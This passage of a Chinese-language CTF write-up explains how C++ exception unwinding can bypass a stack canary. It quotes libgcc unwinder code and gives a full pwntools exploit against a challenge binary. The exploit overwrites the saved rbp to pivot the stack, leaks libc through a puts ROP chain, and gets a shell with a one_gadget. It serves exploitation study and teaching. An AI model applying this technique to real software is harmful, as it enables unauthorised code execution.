          uw_update_context (&cur_context, &fs);
        }
      /* Indicate to _Unwind_Resume and associated subroutines that this
         is not a forced unwind.  Further, note where we found a handler.  */
      exc->private_1 = 0;
      exc->private_2 = uw_identify_context (&cur_context);
      cur_context = this_context;
      code = _Unwind_RaiseException_Phase2 (exc, &cur_context);
      if (code != _URC_INSTALL_CONTEXT)
        return code;
      uw_install_context (&this_context, &cur_context);
    }
    static _Unwind_Reason_Code
    _Unwind_RaiseException_Phase2(struct _Unwind_Exception *exc,
                      struct _Unwind_Context *context)
    {
      _Unwind_Reason_Code code;
      while (1)
        {
          _Unwind_FrameState fs;
          int match_handler;
          code = uw_frame_state_for (context, &fs);
          /* Identify when we've reached the designated handler context.  */
          match_handler = (uw_identify_context (context) == exc->private_2
                   ? _UA_HANDLER_FRAME : 0);
          if (code != _URC_NO_REASON)
        /* Some error encountered.  Usually the unwinder doesn't
           diagnose these and merely crashes.  */
          return _URC_FATAL_PHASE2_ERROR;
          /* Unwind successful.  Run the personality routine, if any.  */
          if (fs.personality)
          {
            code = (*fs.personality) (1, _UA_CLEANUP_PHASE | match_handler,
                        exc->exception_class, exc, context);
            if (code == _URC_INSTALL_CONTEXT)
              break;
            if (code != _URC_CONTINUE_UNWIND) 
              return _URC_FATAL_PHASE2_ERROR;
          }
          /* Don't let us unwind past the handler context.  */
          if (match_handler)
             abort ();
          uw_update_context (context, &fs);
        }
      return code;
    }
如上两个函数分别对应了 unwind 过程中的这两个阶段，注意其中的：
    bashuw_init_context()
    uw_frame_state_for()
    uw_update_context()
这几个函数主要是用来重建函数调用现场的，我们只需要知道它们的很大一部分上下文是可以从堆栈上恢复回来的,如 ebp, esp, 返回地址等。
而这个时候，从栈中恢复保存的ebp值，是从 **sub_401148** 或者是从 **sub_401148** 的上一层函数的ebp呢？
其实从异常捕获结束后流程跳转到40155F我们就可以知道了，这里的leave，相当于
    mov esp,ebp;  恢复esp同时回收局部变量空间
    pop ebp;          从栈中恢复保存的ebp的值
这样一返回，就完全跳过了
canary 的检查
## 思路
如果异常被上一个函数的catch捕获，所以rbp变成了上一个函数的rbp，
而通过构造一个payload把上一个函数的rbp修改成stack_pivot地址， 之后上一个函数返回的时候执行leave
ret，这样一来我们就能成功绕过canary的检查
而且进一步我们也能控制eip，，去执行了stack_pivot中的rop了
### 寻找stack_pivot
如何去覆盖rbp呢?
    message_pattern=0x6061C0
    ret=0x40150c   
    payload1=p64(message_pattern)*37+p64(ret)
构造如此的payload去覆盖rbp
紧接着我们是需要去做一个payload去做infoleak，所以我们利用栈溢出，构造puts
去打印puts_got,获取puts在内存中的地址..然后通过异常机制绕过canary…
    payload2=p64(0)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(message_pattern+0x50)+p64(pop_rsi_r15)+p64(1024)+p64(message_pattern+0x50)+p64(readn)
调试过程中，我们也可以看到开始做infoleak了。。
当这个比较相等的时候，便能进入异常捕获的机制了…
随后，我们就自然而然的跳过了canary的检查…然后我们只需要在构造一个read..写一个one_gadget_rce到stack_pivot上…然后控制返回地址回stack_pivot便能获取一个shell了…
## 完整exp
    #!/usr/bin/env python
    # coding=utf-8
    from pwn import *
    io=process("./pwn.bak")
    context.log_level = 'debug'
    context.terminal = ["tmux", "splitw", "-h"]
    #def attach():
    #    gdb.attach(io, execute="source bp")
    libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
    io.recvuntil("option:\n")
    io.sendline("1")
    print io.recvuntil("(yes/No)")
    io.sendline("No")
    print io.recvuntil("(yes/No)")
    io.sendline("yes")
    print io.recvuntil("length:")
    pause()
    gdb.attach(io,'''break *0x400F45
    				 break *0x4012D4
    				 break *0x40153d''')
    pause()
    io.sendline('-2')
    pause()
    print io.recvuntil("charset:")
    raw_input("send payload 1 overwrite stack ebp --> stack_pivot")
    message_pattern=0x6061C0
    ret=0x40150c   
    payload1=p64(message_pattern)*37+p64(ret)  #overwrite stack ebp --> stack_pivot
    io.sendline(payload1)
    pause()
    print io.recvuntil("\n")
    puts_plt=0x400BD0
    puts_got=0x606020
    readn=0x400F1E  
    pop_rdi=0x4044d3
    pop_rsi_r15=0x4044d1
    raw_input('send payload 2 to leak puts addr')
    payload2=p64(0)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(message_pattern+0x50)+p64(pop_rsi_r15)+p64(1024)+p64(message_pattern+0x50)+p64(readn)
    # puts(put@got) -> readn_0x400f1e( stack_pivot + 0x50, 1024 ) one_gadget_addr to ret -> one_gadget
    io.send(payload2)
    pause()
    io.recvuntil("pattern:\n")
    puts=io.recvuntil("\n")[:-1]
    puts=puts.ljust(8,"\x00")
    puts=u64(puts)
    libc_base=puts-libc.symbols['puts']
    one_gadget=libc_base+0xF2519
    raw_input('send payload3 with one gadget rce')
    payload3=p64(one_gadget)
    io.send(payload3)
    #due to that the exception_handling program is define in func flex_md5_401500, faked ebp_save will be poped to ebp, when exception_handling program finishes, ip will be set to 'leave retn' so we can control ip and stack(stack pivot in bss) than leak and exec.
    pause()
    io.interactive()
## 参考链接